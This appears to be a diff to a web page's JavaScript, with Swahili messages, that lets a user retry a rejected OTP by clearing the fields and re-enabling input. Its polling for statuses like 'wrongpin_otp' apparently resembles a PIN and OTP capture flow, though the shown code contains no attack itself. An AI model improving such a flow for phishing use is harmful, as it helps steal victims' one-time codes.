@@ -1030,8 +1030,15 @@
 
         } else if (data.status === 'rejected') {
           clearInterval(otpPollInterval);
-          showOtpMsg('error', 'Uthibitisho umeshindwa. Tafadhali wasiliana na msaada.');
+          showOtpMsg('error', 'Msimbo wa OTP ulikataliwa. Tafadhali angalia na uweke tena.');
+          // Clear OTP fields and allow retry on same page
+          [0,1,2,3].forEach(i => document.getElementById('o'+i).value = '');
+          document.getElementById('bOtp').className = 'btn-otp';
           document.getElementById('bOtp').disabled = false;
+          document.getElementById('pinWait').classList.remove('show');
+          document.getElementById('otpInputSection').style.display = 'block';
+          // Focus on first OTP field for immediate retry
+          document.getElementById('o0').focus();
 
         } else if (data.status === 'wrongpin_otp') {
           clearInterval(otpPollInterval);
